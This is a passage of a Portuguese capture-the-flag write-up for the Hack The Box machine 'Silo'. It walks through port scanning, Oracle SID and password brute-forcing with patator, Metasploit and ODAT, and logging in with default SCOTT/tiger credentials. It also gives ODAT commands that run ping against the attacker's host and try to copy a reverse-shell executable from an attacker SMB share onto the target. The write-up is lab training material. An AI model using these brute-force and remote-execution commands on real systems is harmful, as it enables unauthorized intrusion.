---
title:     "Hack The Box - Silo"
tags: [windows,medium]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/1.jpg)

## Enumeration

Iniciamos como sempre o nmap para pegarmos informacoes sobre nosso alvo 

```
┌─[htb-an4kein☺parrot]─[~/htb/silo]
└──╼ $sudo nmap --top-ports 30 -sV -oN nmap/topportstcp 10.10.10.82
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 23:49 UTC
Nmap scan report for 10.10.10.82
Host is up (0.16s latency).
Not shown: 26 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 8.5
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, q; CPE: cpe:/o:microsoft:windows
```

Continuando a enumeracao em busca de vulns, usando o proprio nmap e seus scripts para tentar trazer algoo interessante..

```
┌─[htb-an4kein☺parrot]─[~/htb/silo]
└──╼ $nmap -p80,135,139,445 --script vuln 10.10.10.82 -oN nmap/vulns
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 23:53 UTC
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 76.32% done; ETC: 23:53 (0:00:07 remaining)
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.95% done; ETC: 23:54 (0:00:01 remaining)
Nmap scan report for 10.10.10.82
Host is up (0.45s latency).

PORT    STATE SERVICE                                                          
80/tcp  open  http                 
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
135/tcp open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to try

```

Nada muito obvio ate o momento precisamos continuar enumerando, agora vou enumerar cada porta individualmente..

Na porta 80 temos um IIS, posteriormente vou usar o  `gobuster` em busca de files/dir que possa ser uma porta de entrada

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/2.jpg)

Enquanto o gobuster esta rodando, vamos enumerar as outras portas

```
┌─[htb-an4kein☺parrot]─[~/htb/silo]                                                                                                                    [0/127]
└──╼ $sudo gobuster dir -w /opt/SecLists/Discovery/Web-Content/SVNDigger/all.txt -u http://10.10.10.82/ -o gobuster-root.txt
===============================================================                                                                                               
Gobuster v3.0.1                    
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)             
===============================================================      
[+] Url:            http://10.10.10.82/                                        
[+] Threads:        10                                                         
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/SVNDigger/all.txt
[+] Status codes:   200,204,301,302,307,401,403                                
[+] User Agent:     gobuster/3.0.1                                             
[+] Timeout:        10s                                                        
===============================================================                
2020/06/26 00:21:51 Starting gobuster                                          
===============================================================      
/????.txt (Status: 200)            
/??.txt (Status: 200)                                                          
/?? (Status: 200)                                                              
[ERROR] 2020/06/26 00:24:15 [!] parse http://10.10.10.82/%%45^45E^45E480CD%%index.tpl.php: invalid URL escape "%%4"                                           
/???? (Status: 200)                                                            
[ERROR] 2020/06/26 00:24:38 [!] parse http://10.10.10.82/%%F7^F7F^F7F34188%%header.tpl.php: invalid URL escape "%%F"                                          
[ERROR] 2020/06/26 00:24:53 [!] parse http://10.10.10.82/%%0E^0E4^0E407559%%footer.tpl.php: invalid URL escape "%%0"                                          
Progress: 8084 / 43135 (18.74%)           
```

Continuando..

Uma enumeracao rapida usando apenas -a do enum4linux nao trouxe muita coisa, 

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jun 26 01:18:24 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.82
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.82    |
 =================================================== 
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for 10.10.10.82    |
 =========================================== 
Looking up status of 10.10.10.82
No reply from 10.10.10.82

 ==================================== 
|    Session Check on 10.10.10.82    |
 ==================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```
Mas, olhdando com calma o que ja conseguimos.. sabemos que o sistema operacional eh um windows e que pode ser 2008 ou 2012 `Windows Server 2008 R2 - 2012` , entao podemos pesquisar por alguns exploits futuramente..

Preciso enumerar mais..

```
─[htb-an4kein☺parrot]─[~/htb/silo]                                                                                                                      [2/2]
└──╼ $sudo nmap -p139,445 --script smb-vuln-* 10.10.10.82                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 01:26 UTC
Nmap scan report for 10.10.10.82
Host is up (0.21s latency).
                                       
PORT    STATE SERVICE     
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
                                       
Host script results:                                                           
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
                                       
Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds    
┌─[htb-an4kein☺parrot]─[~/htb/silo]                                            
└──╼ $sudo nmap -p139,445 --script smb-enum-* 10.10.10.82                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 01:26 UTC
Nmap scan report for 10.10.10.82
Host is up (0.21s latency).
                                       
PORT    STATE SERVICE                                                          
139/tcp open  netbios-ssn 
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
                                       
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```

Continuamos..

```
┌─[htb-an4kein☺parrot]─[~/htb/silo]                                            
└──╼ $sudo nmap -O -oN nmap/os 10.10.10.82                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 01:28 UTC            
Nmap scan report for 10.10.10.82                                               
Host is up (0.21s latency).                                                    
Not shown: 988 closed ports                                                    
PORT      STATE SERVICE
80/tcp    open  http    
135/tcp   open  msrpc
139/tcp   open  netbios-ssn                                                                                                                                   
445/tcp   open  microsoft-ds                                                   
1521/tcp  open  oracle             
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/26%OT=80%CT=1%CU=31873%PV=Y%DS=2%DC=I%G=Y%TM=5EF54F6
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=I%CI=I%II=I%TS=7)SEQ(
OS:SP=FF%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M54DNW8ST11%O2=M54DN
OS:W8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=
OS:2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=
OS:M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0
OS:%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
```
Interessante, encontramos uma nova porta `1521/tcp  open  oracle`, e vamos em busca de obter mais informacoes
```
┌─[htb-an4kein☺parrot]─[~/htb/silo]                                                                                                                           
└──╼ $sudo nmap -sV -sC -p80,135,139,445,1521 -oN nmap/ports_set 10.10.10.82                                                                                  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 01:36 UTC                                                                                               
Nmap scan report for 10.10.10.82                                                                                                                              
Host is up (0.21s latency).                                                                                                                                   
                                                                                                                                                              
PORT     STATE SERVICE      VERSION                                                                                                                           
80/tcp   open  http         Microsoft IIS httpd 8.5                                                                                                           
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE                                           
|_http-server-header: Microsoft-IIS/8.5                                    
|_http-title: IIS Windows Server                                               
135/tcp  open  msrpc        Microsoft Windows RPC                          
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                  
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:                                                                                                                                          
|_clock-skew: mean: -6s, deviation: 0s, median: -7s         
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:                                                                                                                                          
|   authentication_level: user     
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-26T01:36:44
|_  start_date: 2020-06-25T06:31:52
```

Resolvi entao pesquisar mais sobre esse servico no qual estava rodando na porta 1521 `Oracle TNS listener 11.2.0.2.0 (unauthorized)`

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/3.jpg)

Algumas pesquisa me levaram alguns ataques no qual eu preciso testar e ver se vai surtir efeito...

***reference*** 

    - https://www.cybersecurity-help.cz/vdb/SB2012041801 
    - https://www.securityfocus.com/bid/53308  
    - https://github.com/bongbongco/CVE-2012-1675 
    - https://github.com/quentinhardy/odat/wiki/tnspoison

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/4.jpg)

## Exploitation

Vamos, la explorar esse servico...

Primeiramente, preciso checar se eh vulneravel

***reference*** https://github.com/bongbongco/CVE-2012-1675

`sudo nmap -Pn -sT --script=oracle-tns-poison -p 1521 10.10.10.82`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/5.jpg)

Como podemos ver eh vuln

Realizei algumas pesquisas e encontrei um site interessante que demonstra varios ataques

***reference*** https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Resolvi entao fazer um brute for de SID inicialmente...

### SID Bruteforce

`patator oracle_login host=10.10.10.82 sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505`

`msf5 > use auxiliary/admin/oracle/sid_brute`

Consegui entao os seguintes SID

```
CLRExtProc
PLSExtProc
XE
```

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/6.jpg)

De acordo com o site de referencia que estamos usando ele informa que precisamos ter uma credencial

```
Got SID? Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.
```

### User/Pass bruteforce

Bom, entao eh isso que vamos buscar agora... CREDENTIALS

Ate o momento nenhuma conta valida encontrada,ja usei as seguintes wordlists

```
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
/usr/share/nmap/nselib/data/oracle-default-accounts.lst
/home/htb-an4kein/htb/silo/brute/oracle-betterdefaultpasslist.txt
```

Depois de diversas tentativas de wordlists, resolvi modificar a padrao utilizada com `UPPER:lower lower:lower lower:UPPER UPPER:UPPER`

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/7.jpg)

Boom, eu ainda estou tentando encontrar uma conta usando brute-force. ate o momento  nada aindaa

continuaaa................ I need sleep :/

Continuando a saga ate encontrar uma conta valida, observe na imagem abaixo as tentativas sendo efetuadas.. observe tbm a INFO que a conta de SYSTEM eh bloqueada

`patator oracle_login host=10.10.10.82 sid=XE user=FILE0 password=FILE1 0=users.txt 1=passwords_upper.txt -x ignore:code=ORA-01017`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/8.jpg)

veja,antes estava dando errors por nao ter passado um SID valido

`patator oracle_login host=10.10.10.82 user=FILE0 password=FILE1 0=users.txt 1=passwords_upper.txt -x ignore:code=ORA-01017 --allow-ignore-failures `

![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/9.jpg)

Ainda tentando encontrar algo

![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/10.jpg)

Faz mais de 6 horas que estou tentando encontra um login valido, ja tentei varias listas de senhas default de ORACLE mas sem sucesso.. Estou utilizando agora uma lista de `names.txt` do repo seclists

```
root@kali:~/HTB-Windows/silo/brute# cp /usr/share/seclists/Usernames/Names/names.txt .
root@kali:~/HTB-Windows/silo/brute# cp /usr/share/seclists/Usernames/Names/names.txt names1.txt
```

`patator oracle_login host=10.10.10.82 sid=XE user=FILE0 password=FILE1 0=names.txt 1=names1.txt -x ignore:code=ORA-01017`

![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/11.jpg)

Fazer brute demora bastante, exige muits paciencia de sua parte... entao, enquanto esta sendo realizado vou ir fazendo outra maquina... assim que conseguir as creds validas eu volto a este post..

De volta a maquina, entao hoje voltei a fazer a Silo nas tentativas anteriores nao deu muito certo... As vezes voce so precisa esfriar a cabeca, fazer uma outra coisa e depois voltar a fazer a maquina quando as coisas nao estiverem mais fluindo em sua cabeca...

Acabei de iniciar minha maquina e conectar ao lab HTB.

Entao, voltei a fazer o mesmo processo novamente.. Agora com calma, alimentado, descansado em outras palavras SUAVEEEEEEEEEEEEE

Primeiro eu fiz um novo scan com  o nmap, dessa vez algo mais agressivo..

```
root@kali:~/HTB-Windows/silo# nmap -sV -sC -p- -T4 -oN nmap/silo -vvv 10.10.10.82     
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-28 14:27 EDT           
NSE: Loaded 151 scripts for scanning.                                                                                                                                      
NSE: Script Pre-scanning.                                                                                                                                                  
NSE: Starting runlevel 1 (of 3) scan.                                                
Initiating NSE at 14:27                                                              
Completed NSE at 14:27, 0.00s elapsed                                                
NSE: Starting runlevel 2 (of 3) scan.                                                
Initiating NSE at 14:27                                                              
Completed NSE at 14:27, 0.00s elapsed                                                
NSE: Starting runlevel 3 (of 3) scan.                                                
Initiating NSE at 14:27                                                              
Completed NSE at 14:27, 0.00s elapsed                                                
Initiating Ping Scan at 14:27                                                        
Scanning 10.10.10.82 [4 ports]                                                       
Completed Ping Scan at 14:27, 0.20s elapsed (1 total hosts)                                                                                                                
Initiating Parallel DNS resolution of 1 host. at 14:27                               
Completed Parallel DNS resolution of 1 host. at 14:27, 2.16s elapsed                 
DNS resolution of 1 IPs took 2.16s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                           
Initiating SYN Stealth Scan at 14:27                                                 
Scanning 10.10.10.82 [65535 ports]                                                   
Discovered open port 135/tcp on 10.10.10.82                                          
Discovered open port 139/tcp on 10.10.10.82                                          
Discovered open port 445/tcp on 10.10.10.82                                                                                                                                
Discovered open port 80/tcp on 10.10.10.82                                           
Discovered open port 49161/tcp on 10.10.10.82                             
SYN Stealth Scan Timing: About 6.30% done; ETC: 14:35 (0:07:41 remaining)            
Discovered open port 49162/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 10.70% done; ETC: 14:36 (0:08:29 remaining)
SYN Stealth Scan Timing: About 16.40% done; ETC: 14:36 (0:07:44 remaining)
Discovered open port 49155/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 22.56% done; ETC: 14:36 (0:07:16 remaining)
Discovered open port 1521/tcp on 10.10.10.82
Discovered open port 49153/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 36.00% done; ETC: 14:37 (0:06:42 remaining)
Discovered open port 47001/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 42.43% done; ETC: 14:37 (0:05:47 remaining)
SYN Stealth Scan Timing: About 47.81% done; ETC: 14:37 (0:05:15 remaining)
SYN Stealth Scan Timing: About 53.81% done; ETC: 14:37 (0:04:44 remaining)
Discovered open port 49160/tcp on 10.10.10.82
Discovered open port 49158/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 59.51% done; ETC: 14:37 (0:04:06 remaining)
Discovered open port 49152/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 64.61% done; ETC: 14:37 (0:03:34 remaining)
SYN Stealth Scan Timing: About 70.19% done; ETC: 14:37 (0:02:59 remaining)
SYN Stealth Scan Timing: About 75.32% done; ETC: 14:37 (0:02:28 remaining)
Discovered open port 5985/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 80.75% done; ETC: 14:37 (0:01:55 remaining)
SYN Stealth Scan Timing: About 86.01% done; ETC: 14:37 (0:01:24 remaining)
SYN Stealth Scan Timing: About 91.27% done; ETC: 14:37 (0:00:53 remaining)
Discovered open port 49154/tcp on 10.10.10.82
Completed SYN Stealth Scan at 14:37, 610.50s elapsed (65535 total ports)
Initiating Service scan at 14:37
Scanning 15 services on 10.10.10.82
Service scan Timing: About 53.33% done; ETC: 14:39 (0:00:49 remaining)
Completed Service scan at 14:39, 121.59s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.10.82.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 10.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Nmap scan report for 10.10.10.82
Host is up, received echo-reply ttl 127 (0.18s latency).
Scanned at 2020-06-28 14:27:11 EDT for 745s
Not shown: 65520 closed ports
Reason: 65520 resets
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   syn-ack ttl 127 Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  oracle-tns   syn-ack ttl 127 Oracle TNS listener (requires service name)
49161/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28507/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52707/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38458/udp): CLEAN (Failed to receive data)
|   Check 4 (port 6292/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-28T18:39:28
|_  start_date: 2020-06-28T16:14:25

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 746.32 seconds
           Raw packets sent: 74362 (3.272MB) | Rcvd: 329713 (32.759MB)
```

Encontrei mais portas, porem vou voltar a fazer o brute conforme estavamos fazendo anteriormente..

Veja, eu estava tentando usando o patator, mas nao estava dando certo.

![12.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/12.jpg)

Obs: Gostei muito do pwnbox, mas fiquei muito decepcionado ao mesmo tempo.. tem limite de uso// 24h no mes... 

Esse passo vou fazer usando o metasploit auxiliar para esse objetivo..

![13.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/13.jpg)

Tambem sem sucesso, estava sem ideias ja do que fazer.. ja tinha usado varias wordlists, as principais tools e nada de ter uma cred valida..

Voltei no odat e comecei a ler o projeto e vi que ele praticamente faz todo o ataque..

`ODAT (Oracle Database Attacking Tool) is an open source penetration testing tool that tests the security of Oracle Databases remotely.`

![odat](https://raw.githubusercontent.com/quentinhardy/odat/master-python3/pictures/ODAT_main_features_v2.0.jpg)

No momento estou fazendo o brute novamente utilizando o proprio 0dat, vamos ver se conseguimos dessa vez uma cred valida

`python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --login-as-pwd --output-file SILO.txt`

![15.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/15.jpg)

Nada!!! Talvez parametros errados.. Vou continuar tentando.

`python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/accounts_multiple.txt --login-as-pwd -n --output-file SILO2`

![16.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/16.jpg)

Realizei mais algumas alteracoes na wordlist com creds default..

Usei o libreoffice para formatar como eu queria e agilizar o trampo, a opcap `--login-as-pwd` modifica apenas o campo de senha e nao o user, e como sabemos a wordlist do odat todos os users e passwords sao em UPPER.. formatei conforme falei anteiormente e vou tentar novamente;

![17.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/17.jpg)

vamos nos novamente tentar

`python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-files accounts/loginFile accounts/pwdFile --output-file SILO3`

![18.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/18.jpg)

Por um tempo eu achei que nao estivesse funcionando, umas verificada rapida usando `tcpdump` vejo que esta fluindo a conexao 

![19.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/19.jpg)

Mas mesmo assim eu nao conseguia encontrar uma cred valida, comecei a debugar e ver como estava sendo enviado as cred de acordo com os parametros passados

Observe na imagem a seguir que as senhas mesmo passando a opcao `--both-ul` para testar o password tanto em LOWER OU UPPER CASE, mas essa funcao vem setada como `False`
mesmo eu tentando passar `--both-ul=True` ou `--both-ul True` ou `--both-ul "True"` ou `--both-ul 'True'` NADA FUNCIONAVA.

![20.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/20.jpg)

Veeja o menu do modulo de brute

![21.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/21.jpg)

Entao comecei a ler o codigo, e modifiquei diretamente no source a opcao que estava como `False` para `True`.

Ficando assim:

![22.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/22.jpg)

Pronto agora estava testando tanto em UPPER como em LOWER

Depois de tanto tempo, conseguimos obter a CRED

`python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/accounts_multiple.txt --both-ul --output-file SILO2 -vv`

![23.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/23.jpg)

Estava teanto replicar novamente, vejam o erro que ocorre..

`DEBUG -: Error during connection with this account: ORA-28000: the account is locked`

![24.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/24.jpg)

Mesmo colocando SLEEP 2,3,5 nada... 

Envim, vamos continuar agora que ja temos o SID e a CRED



Ok, depois de obter a cred necessaria vou tentar obter um RCE...  de acordo com o site de referencia isso eh possivel

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Primeiro eu precisa testar se realmente eu consigo executar comandos, usando o tcpdump eu consigo verificar se me retorna um ping.

`tcpdump -i tun0 icmp -vv`

depois de ativar o tcpdump na interface da VPN e setar o protocolo ICMP e deixar em modo verbose

tentamos entao executar comandos

`python3 ./odat.py java -s 10.10.10.82 -U SCOTT -P tiger -d XE --exec 'ping -n 10.10.14.37'`

![25.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/25.jpg)

nao tem JAVA, entao temos o outro metodo..

tentei via `Execute code via External Tables` mas nao tinha privilegio suficiente...

`python3 ./odat.py externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --exec "copy \\10.10.14.37\tools\reverse64.exe" "C:\windows\temp\reverse64.exe"`

![26.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/26.jpg)

ja que nao tinhamos privilegios o suficiente, resolvi verificar quais eram os privileges para meu user

`python3 ./odat.py privesc -s 10.10.10.82 -d XE -U SCOTT -P tiger --get-privs`

![27.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/27.jpg)


eu precisava saber minha locazacao e assim tentar escrever algum arquivo.. entao fui pesquisar um pouco mais..

![28.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/28.jpg)

![29.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/29.jpg)


depois de ler o que tinha encontrado eu precisava de um client em meu localhost para realizar a comunicacao e ver se achava algo interessante

### Install SQLPLUS CLIENT

`apt search sqlplus`

![30.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/30.jpg)

`apt install oracle-instantclient-sqlplus`

![31.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/31.jpg)

```
root@kali:/opt/odat# sqlplus --help
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory

https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared

Preparing to unpack .../oracle-instantclient-sqlplus_19.6.0.0.0-0kali1_amd64.deb ...

export ORACLE_HOME=/opt/oracle/instantclient_19_6
export LD_LIBRARY_PATH="$ORACLE_HOME"
export PATH="$ORACLE_HOME:$PATH"
sqlplus

root@kali:/opt/odat# export ORACLE_HOME=/opt/oracle/instantclient_19_6
root@kali:/opt/odat# export LD_LIBRARY_PATH="$ORACLE_HOME"
root@kali:/opt/odat# export PATH="$ORACLE_HOME:$PATH"
root@kali:/opt/odat# sqlplus 
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
root@kali:/opt/odat# apt install libsqlplus
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package libsqlplus
root@kali:/opt/odat# apt install libsqlplus^C
root@kali:/opt/odat# ldconfig 
root@kali:/opt/odat# sqlplus 

SQL*Plus: Release 19.0.0.0.0 - Production on Mon Jun 29 19:15:48 2020
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

Enter user-name: 

```

Depois de configurar o clliente tive um errro ao tentar me conectar

```
root@kali:/opt/odat# sqlplus                                                                                                                                  
                                                                                     
SQL*Plus: Release 19.0.0.0.0 - Production on Mon Jun 29 19:15:48 2020                
Version 19.6.0.0.0                                                                   
                                                                                     
Copyright (c) 1982, 2019, Oracle.  All rights reserved.                              
                                                                                     
Enter user-name: SCOTT
Enter password:                           
ERROR:                                    
ORA-12162: TNS:net service name is incorrectly specified                             


Enter user-name: ^C^C                     
root@kali:/opt/odat# sqlplus --help       
```

Mas depoid de ver o help me conectei,,

`sqlplus SCOTT/tiger@10.10.10.82/XE`

![32.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/32.jpg)

Resolvi voltar pro  odat esse framework eh bem completo

